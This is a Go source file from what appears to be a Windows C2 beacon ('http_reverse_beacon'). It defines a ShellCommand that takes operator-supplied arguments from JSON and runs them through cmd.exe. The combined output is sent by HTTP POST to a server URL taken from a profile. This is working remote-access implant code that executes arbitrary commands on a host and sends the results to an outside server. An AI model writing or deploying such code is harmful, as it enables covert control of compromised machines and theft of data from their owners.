package command

import (
	"encoding/json"
	"errors"
	"http_reverse_beacon/packet"
	"http_reverse_beacon/profile"
	"os/exec"
)

type ShellCommand struct {
	*Commnad

	Args []string
	Env  []string
}

func (c *ShellCommand) Unmarshall(data []byte) error {
	err := json.Unmarshal(data, &c)
	if err != nil {
		return errors.New("unmarshall failed")
	}
	return nil
}

func (c *ShellCommand) Shell() {
	args := []string{"/c"}
	args = append(args, c.Args...)
	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe", args...)
	if len(c.Env) != 0 {
		cmd.Env = c.Env
	}
	output, _ := cmd.CombinedOutput()

	packet.HttpPost(profile.PostUrl, output)
}
